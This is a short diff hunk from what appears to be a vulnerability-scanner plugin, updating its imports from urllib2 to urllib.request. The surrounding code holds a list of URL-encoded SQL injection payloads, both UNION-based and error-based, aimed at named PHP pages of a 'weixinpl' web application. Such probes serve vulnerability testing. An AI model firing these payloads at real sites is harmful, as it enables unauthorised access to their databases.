@@ -10,7 +10,7 @@ def assign(service, arg):
 
 
 def audit(arg):
-    import urllib2
+    import urllib.request, urllib.error, urllib.parse
     payloads = ['weixinpl/huodong/show_huodong.php?customer_id=-1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2Cmd5%280x22%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20',\
     'weixinpl/miaosha/show_miaosha.php?customer_id=-1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2Cmd5%280x22%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20',\
 'weixinpl/order_car/show_car.php?customer_id=-1%20or%20%28SELECT%203442%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%28md5%280x22%29%2C%28SELECT%20%28ELT%283442%3D3442%2C1%29%29%29%2C0x7171717071%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29',\
